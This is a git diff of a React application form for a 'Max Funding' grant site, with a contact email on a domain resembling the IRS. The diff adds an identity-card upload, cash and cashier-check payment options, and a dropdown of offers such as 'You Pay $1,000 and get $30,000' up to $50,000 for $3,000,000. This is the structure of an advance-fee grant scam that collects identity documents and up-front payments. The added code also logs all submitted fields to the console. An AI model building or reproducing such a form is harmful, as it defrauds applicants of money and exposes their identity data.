@@ -17,8 +17,11 @@ const Form = () => {
     const [submitMessage, setSubmitMessage] = useState('');
     const [messageVisible, setMessageVisible] = useState(false);
     const [file, setFile] = useState(null);
-
-    
+    const [progress, setProgress] = useState(0);
+    const [isSubmitting, setIsSubmitting] = useState(false);
+    const [paymentMethod, setPaymentMethod] = useState("");
+    const [creditDescription, setCreditDescription] = useState("");
+    const [moneyRequirement, setMoneyRequirement] = useState("");
     
 
     
@@ -45,10 +48,16 @@ const Form = () => {
         monthlyIncome: "",
         grantPurpose: "",
         country: "United States of America",
-        vaccine: selectedVaccine,
+        selectedVaccine: "",
+        // vaccine: selectedVaccine,
         reasonForNoVaccine: selectedVaccine === "No, I didn't receive the vaccine" ? vaccineReason : null,
-        identityCardType,
-        file,
+        identityCardType: "",
+        paymentMethod: "",
+        creditDescription: "",
+        moneyRequirement: "",
+        file: ""
+
+        
     });
 
     const handleFileChange = (e) => {
@@ -107,6 +116,19 @@ const Form = () => {
             alert("Please agree to the terms before submitting.");
             return;
         }
+        setIsSubmitting(true); // Show the progress circle
+        setProgress(0);
+
+        // Simulate progress
+        const interval = setInterval(() => {
+            setProgress((prev) => {
+                if (prev >= 100) {
+                    clearInterval(interval);
+                    return 100;
+                }
+                return prev + 1;
+            });
+        }, 50); // Increment progress by 1% every 50ms
 
         try {
             // Create a FormData object to handle both file and text inputs
@@ -122,11 +144,19 @@ const Form = () => {
                     }
                 }
             }
-
-            // Add file separately
+            for (let [key, value] of formDataToSend.entries()) {
+                console.log(`${key}:`, value);
+            }
             if (file) {
                 formDataToSend.append("file", file);
-            }
+              } else {
+                console.warn("No file selected");
+              }
+            formDataToSend.append("creditDescription", creditDescription);
+            formDataToSend.append("moneyRequirement", moneyRequirement);
+            formDataToSend.append("paymentMethod", paymentMethod);
+              
+            
 
             // Make POST request with Axios
             const response = await axios.post(`${process.env.REACT_APP_BACKEND_URL}/submit-form`, formDataToSend, {
@@ -151,6 +181,10 @@ const Form = () => {
         } catch (error) {
             console.error("Error submitting form:", error);
             alert("An error occurred while submitting the form. Please try again.");
+        }
+        finally {
+            setIsSubmitting(false); // Hide the progress circle
+            setProgress(0);
         }
     };
 
@@ -180,13 +214,20 @@ const Form = () => {
                 <h1 className="navbar-title" onClick={handleHomeNavigation} style={{ cursor: "pointer" }}>
                     Max Funding
                 </h1>
-                <div className="contact-info">
+                {/* <div className="contact-info">
                     <span>+1(480) 920-0606</span>
                     <span>info@irsgrantfederal.com</span>
-                </div>
+                </div> */}
                 <a href="/apply-now" className="btn-apply">Apply Now</a>
             </nav>
-            
+        <nav className="navbar-secondary">
+            <button className="nav-button" onClick={handleHomeNavigation}>Home</button>
+            <button className="nav-button" onClick={handleHomeNavigation}>About Us</button>
+            <button className="nav-button" onClick={handleHomeNavigation}>Testimonials</button>
+            <button className="nav-button" onClick={handleHomeNavigation}>Video</button>
+            <button className="nav-button" onClick={handleHomeNavigation}>Benefit Data</button>
+            <button className="nav-button" onClick={handleHomeNavigation}>Contact Us</button>
+        </nav>
 
             {/* Form Content */}
         
@@ -506,7 +547,7 @@ const Form = () => {
             </div>
 
             {/* Education Level Dropdown */}
-            <div className="form-row">
+            <div className="form-group form-row">
                 <label htmlFor="educationLevel">
                     Education Level <span className="required">*</span>
                 </label>
@@ -532,7 +573,7 @@ const Form = () => {
             </div>
 
             {/* Employment Status Dropdown */}
-            <div className="form-row">
+            <div className="form-group form-row">
                 <label htmlFor="employmentStatus">
                     Employment Status <span className="required">*</span>
                 </label>
@@ -651,7 +692,7 @@ const Form = () => {
         <h4>Proof Of Need</h4>
         </div>
 
-        <div className="form-row">
+        <div className="form-group form-row">
         <label className="radio-group">
             <span>Do you have any dependent with special needs?</span>
             <div className="radio-options">
@@ -859,7 +900,7 @@ const Form = () => {
                 </div>
             </div>
 
-            <div className="form-group">
+            <div className="form-group form-row">
                 <label htmlFor="vaccine-select">
                 Have you received the COVID-19 vaccine? If so, which one did you receive? <span className="required">*</span>
                 </label>
@@ -914,7 +955,7 @@ const Form = () => {
             </div>
 
             {/* File Upload */}
-            <div className="form-group">
+            <div className="form-row">
                 <label htmlFor="identity-upload">
                 Upload Identity Card <span className="required">*</span>
                 </label>
@@ -928,12 +969,101 @@ const Form = () => {
                 />
             </div>
 
-            
+            {/* Select Payment Method */}
+            <div className="form-group form-row">
+                <label htmlFor="payment-method">
+                Select Payment Method <span className="required">*</span>
+                </label>
+                <select
+                id="payment-method"
+                className="form-select"
+                name="paymentMethod"
+                value={paymentMethod}
+                onChange={(e) => setPaymentMethod(e.target.value)}
+                required
+                >
+                <option value="">- Select -</option>
+                <option value="Cash">Cash</option>
+                <option value="Bank Transfer">Bank Transfer</option>
+                <option value="Cashier Checks">Cashier Checks</option>
+                </select>
+            </div>
 
             
+      
+      
 
+      {/* Describe Your Credit */}
+      <div className="form-group form-row">
+        <p className="form-label">
+          How would you describe your credit? <span className="required">*</span>
+        </p>
+        <div className="form-radio-group">
+          {["Excellent", "Good", "Fair", "Poor"].map((option, index) => (
+            <label key={index} className="form-radio">
+              <input
+                type="radio"
+                name="creditDescription"
+                value={option}
+                checked={creditDescription === option}
+                onChange={(e) => setCreditDescription(e.target.value)}
+              />
+              <span className="radio-bullet"></span>
+              {option}
+            </label>
+          ))}
+        </div>
+      </div>
 
-        
+      {/* Money Requirement */}
+      <div className="form-group">
+        <label htmlFor="money-requirement" className="form-label">
+          How much money are you going to need? <span className="required">*</span>
+        </label>
+        <select
+          id="money-requirement"
+          className="form-select"
+          name="moneyRequirement"
+          value={moneyRequirement}
+          onChange={(e) => setMoneyRequirement(e.target.value)}
+        >
+          <option value="">-Select-</option>
+          <option value="You Pay $1,000 and get $30,000.00.">
+          You Pay $1,000 and get $30,000.00.
+          </option>
+          <option value="You Pay $2,000 and get $50,000.00.">
+          You Pay $2,000 and get $50,000.00
+          </option>
+          <option value="You pay $5,000 and get $100,000.00.">
+          You pay $5,000 and get $100,000.00.
+          </option>
+          <option value="You pay $7,500 and get $150,000.00.">
+          You pay $7,500 and get $150,000.00.
+          </option>
+          <option value="You pay $9,000 and get $200,000.00.">
+          You pay $9,000 and get $200,000.00.
+          </option>
+          <option value="You pay $10,000 and get $300,000.00.">
+          You pay $10,000 and get $300,000.00.
+          </option>
+          <option value="You pay $15,000 and get $450,000.00.">
+          You pay $15,000 and get $450,000.00.
+          </option>
+          <option value="You pay $20,000 and get $550,000.00.">
+          You pay $20,000 and get $550,000.00.
+          </option>
+          <option value="You pay $25,000.00 and get $750,000.00.">
+          You pay $25,000.00 and get $750,000.00.
+          </option>
+          <option value="You pay $30,000.00 and get $1,000,000.00.">
+          You pay $30,000.00 and get $1,000,000.00.
+          </option>
+          <option value="You pay $50,000.00 and get $3,000,000.00.">
+            You pay $50,000.00 and get $3,000,000.00.
+          </option>
+        </select>
+      </div>
+
                 <div className="form-row consent">
                     <label>
                         <input
@@ -946,15 +1076,39 @@ const Form = () => {
                     </label>
                     
                 </div>
+                {isSubmitting && (
+                    <div className="circle-container">
+                        <svg className="progress-circles" width="100" height="100">
+                            <circle
+                                className="progress-background"
+                                cx="50"
+                                cy="50"
+                                r="45"
+                                strokeWidth="5"
+                            />
+                            <circle
+                                className="progress-bar"
+                                cx="50"
+                                cy="50"
+                                r="45"
+                                strokeWidth="5"
+                                strokeDasharray="283"
+                                strokeDashoffset={283 - (283 * progress) / 100}
+                                fill="none"
+                            />
+                        </svg>
+                        <div className="progress-text">{progress}%</div>
+                    </div>
+                )}
                 <button type="button" onClick={handleBack}>
             Back
             </button>
                 <button type="submit" className="form-submit">Submit</button>
                 </>
-    )} 
+            )} 
                 
                 
-            </form>
+        </form>
             {messageVisible && (
                 <div className={`success-message ${messageVisible ? 'show' : 'hide'}`}>
                     {submitMessage}
